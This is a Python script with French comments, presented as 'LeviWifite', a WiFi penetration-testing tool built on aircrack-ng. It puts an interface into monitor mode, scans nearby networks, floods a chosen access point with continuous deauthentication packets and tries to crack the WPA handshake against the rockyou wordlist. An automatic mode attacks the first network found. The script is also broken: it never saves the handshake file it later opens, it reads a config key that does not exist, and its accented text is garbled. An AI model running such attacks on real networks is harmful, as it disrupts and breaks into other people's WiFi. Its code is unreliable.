#!/usr/bin/env python3
"""
LEVIWIFITE - Outil de Pentest WiFi Avanc√©
Combinaison de Wifite + Airgeddon avec coordination multi-langage
"""

import os
import sys
import subprocess
import json
import time
import threading
from datetime import datetime
import argparse
import signal

class LeviWifite:
    def __init__(self):
        self.targets = []
        self.current_attack = None
        self.attack_history = []
        self.config = self.load_config()
        
    def load_config(self):
        """Charge la configuration depuis config.json"""
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return self.default_config()
    
    def default_config(self):
        """Configuration par d√©faut"""
        return {
            "interface": "wlan0",
            "monitor_mode": True,
            "attack_timeout": 300,
            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
            "output_dir": "results",
            "log_level": "INFO"
        }
    
    def start_monitor_mode(self):
        """Active le mode monitor sur l'interface"""
        print("[+] Activation du mode monitor...")
        try:
            subprocess.run(['airmon-ng', 'start', self.config['interface']], check=True)
            print(f"[+] Mode monitor activ√© sur {self.config['interface']}")
            return True
        except subprocess.CalledProcessError:
            print(f"[-] Erreur lors de l'activation du mode monitor")
            return False
    
    def scan_networks(self):
        """Scanne les r√©seaux WiFi disponibles"""
        print("[+] Scan des r√©seaux WiFi...")
        try:
            result = subprocess.run(['airodump-ng', self.config['interface'], '--output-format', 'csv'], 
                                 capture_output=True, text=True, timeout=30)
            networks = self.parse_airodump_output(result.stdout)
            self.targets = networks
            print(f"[+] {len(networks)} r√©seaux trouv√©s")
            return networks
        except subprocess.TimeoutExpired:
            print("[-] Timeout du scan")
            return []
    
    def parse_airodump_output(self, output):
        """Parse la sortie d'airodump-ng"""
        networks = []
        lines = output.split('\n')
        for line in lines:
            if line.strip() and ',' in line:
                parts = line.split(',')
                if len(parts) >= 14 and parts[0].strip():
                    try:
                        bssid = parts[0].strip()
                        essid = parts[13].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        if bssid and bssid != 'BSSID':
                            networks.append({
                                'bssid': bssid,
                                'essid': essid,
                                'channel': channel,
                                'power': power
                            })
                    except IndexError:
                        continue
        return networks
    
    def deauth_attack(self, target):
        """Attaque de d√©authentification"""
        print(f"[+] Attaque de d√©authentification sur {target['essid']} ({target['bssid']})")
        try:
            cmd = ['aireplay-ng', '--deauth', '0', '-a', target['bssid'], self.config['interface']]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.current_attack = process
            return process
        except Exception as e:
            print(f"[-] Erreur lors de l'attaque: {e}")
            return None
    
    def crack_handshake(self, target, handshake_file):
        """Crack le handshake captur√©"""
        print(f"[+] Tentative de crack du handshake pour {target['essid']}")
        try:
            cmd = ['aircrack-ng', handshake_file, '-w', self.config['config']['wordlist_path']]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if 'KEY FOUND!' in result.stdout:
                print(f"[+] Cl√© trouv√©e pour {target['essid']}!")
                return True
            else:
                print(f"[-] Cl√© non trouv√©e pour {target['essid']}")
                return False
        except subprocess.TimeoutExpired:
            print(f"[-] Timeout du crack pour {target['essid']}")
            return False
    
    def run_attack_sequence(self, target):
        """Ex√©cute la s√©quence d'attaque compl√®te"""
        print(f"\n[+] D√©but de l'attaque sur {target['essid']}")
        
        # 1. D√©authentification
        deauth_process = self.deauth_attack(target)
        if not deauth_process:
            return False
        
        # 2. Capture du handshake
        print("[+] Capture du handshake...")
        time.sleep(10)  # Attendre la capture
        
        # 3. Arr√™t de la d√©authentification
        if deauth_process:
            deauth_process.terminate()
        
        # 4. Tentative de crack
        handshake_file = f"handshake_{target['bssid'].replace(':', '')}.cap"
        if os.path.exists(handshake_file):
            success = self.crack_handshake(target, handshake_file)
            self.attack_history.append({
                'target': target,
                'timestamp': datetime.now().isoformat(),
                'success': success
            })
            return success
        
        return False
    
    def generate_report(self):
        """G√©n√®re un rapport HTML des attaques"""
        print("[+] G√©n√©ration du rapport...")
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Rapport LeviWifite</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .target {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }}
                .success {{ border-left: 5px solid #27ae60; }}
                .failure {{ border-left: 5px solid #e74c3c; }}
                .stats {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>üöÄ LEVIWIFITE - Rapport de Pentest</h1>
                <p>G√©n√©r√© le: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
            
            <div class="stats">
                <h2>üìä Statistiques</h2>
                <p>Total des cibles: {len(self.targets)}</p>
                <p>Attaques r√©ussies: {len([a for a in self.attack_history if a['success']])}</p>
                <p>Attaques √©chou√©es: {len([a for a in self.attack_history if not a['success']])}</p>
            </div>
            
            <h2>üéØ Cibles Scann√©es</h2>
        """
        
        for target in self.targets:
            html_content += f"""
            <div class="target">
                <h3>{target['essid'] or 'SSID Cach√©'}</h3>
                <p><strong>BSSID:</strong> {target['bssid']}</p>
                <p><strong>Canal:</strong> {target['channel']}</p>
                <p><strong>Puissance:</strong> {target['power']}</p>
            </div>
            """
        
        html_content += """
            <h2>‚öîÔ∏è Historique des Attaques</h2>
        """
        
        for attack in self.attack_history:
            status_class = "success" if attack['success'] else "failure"
            status_text = "‚úÖ Succ√®s" if attack['success'] else "‚ùå √âchec"
            html_content += f"""
            <div class="target {status_class}">
                <h3>{attack['target']['essid'] or 'SSID Cach√©'}</h3>
                <p><strong>Statut:</strong> {status_text}</p>
                <p><strong>Timestamp:</strong> {attack['timestamp']}</p>
                <p><strong>BSSID:</strong> {attack['target']['bssid']}</p>
            </div>
            """
        
        html_content += """
        </body>
        </html>
        """
        
        with open('rapport_leviwifite.html', 'w') as f:
            f.write(html_content)
        
        print("[+] Rapport g√©n√©r√©: rapport_leviwifite.html")
    
    def cleanup(self):
        """Nettoyage et arr√™t propre"""
        print("\n[+] Nettoyage en cours...")
        
        if self.current_attack:
            self.current_attack.terminate()
        
        # D√©sactiver le mode monitor
        try:
            subprocess.run(['airmon-ng', 'stop', self.config['interface']], check=True)
            print("[+] Mode monitor d√©sactiv√©")
        except:
            pass
        
        # G√©n√©rer le rapport final
        self.generate_report()
        print("[+] Nettoyage termin√©")

def signal_handler(signum, frame):
    """Gestionnaire de signal pour arr√™t propre"""
    print("\n[!] Signal d'arr√™t re√ßu. Nettoyage...")
    if hasattr(signal_handler, 'leviwifite'):
        signal_handler.leviwifite.cleanup()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='LEVIWIFITE - Outil de Pentest WiFi Avanc√©')
    parser.add_argument('-i', '--interface', default='wlan0', help='Interface WiFi')
    parser.add_argument('-t', '--target', help='BSSID sp√©cifique √† attaquer')
    parser.add_argument('--auto', action='store_true', help='Mode automatique')
    parser.add_argument('--scan-only', action='store_true', help='Scan uniquement')
    
    args = parser.parse_args()
    
    # Configuration du gestionnaire de signal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Initialisation
    leviwifite = LeviWifite()
    signal_handler.leviwifite = leviwifite
    
    if args.interface:
        leviwifite.config['interface'] = args.interface
    
    print("""
    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
    ‚ïë                    üöÄ LEVIWIFITE üöÄ                        ‚ïë
    ‚ïë              Outil de Pentest WiFi Avanc√©                  ‚ïë
    ‚ïë              Wifite + Airgeddon + Coordination             ‚ïë
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    """)
    
    try:
        # Activation du mode monitor
        if not leviwifite.start_monitor_mode():
            print("[-] Impossible d'activer le mode monitor. Arr√™t.")
            return
        
        # Scan des r√©seaux
        networks = leviwifite.scan_networks()
        if not networks:
            print("[-] Aucun r√©seau trouv√©. Arr√™t.")
            return
        
        # Affichage des r√©seaux
        print("\nüì° R√©seaux WiFi d√©tect√©s:")
        for i, network in enumerate(networks):
            print(f"  {i+1}. {network['essid'] or 'SSID Cach√©'} - {network['bssid']} (Canal {network['channel']})")
        
        if args.scan_only:
            return
        
        # S√©lection de la cible
        if args.target:
            target = next((n for n in networks if n['bssid'] == args.target), None)
            if not target:
                print(f"[-] Cible {args.target} non trouv√©e")
                return
        else:
            if args.auto:
                target = networks[0]  # Premi√®re cible
            else:
                try:
                    choice = int(input(f"\nüéØ Choisissez une cible (1-{len(networks)}): ")) - 1
                    target = networks[choice]
                except (ValueError, IndexError):
                    print("[-] Choix invalide")
                    return
        
        print(f"\n[+] Cible s√©lectionn√©e: {target['essid']} ({target['bssid']})")
        
        # Ex√©cution de l'attaque
        success = leviwifite.run_attack_sequence(target)
        
        if success:
            print(f"\nüéâ Attaque r√©ussie sur {target['essid']}!")
        else:
            print(f"\nüí• Attaque √©chou√©e sur {target['essid']}")
        
    except KeyboardInterrupt:
        print("\n[!] Interruption utilisateur")
    except Exception as e:
        print(f"\n[-] Erreur: {e}")
    finally:
        leviwifite.cleanup()

if __name__ == "__main__":
    main()
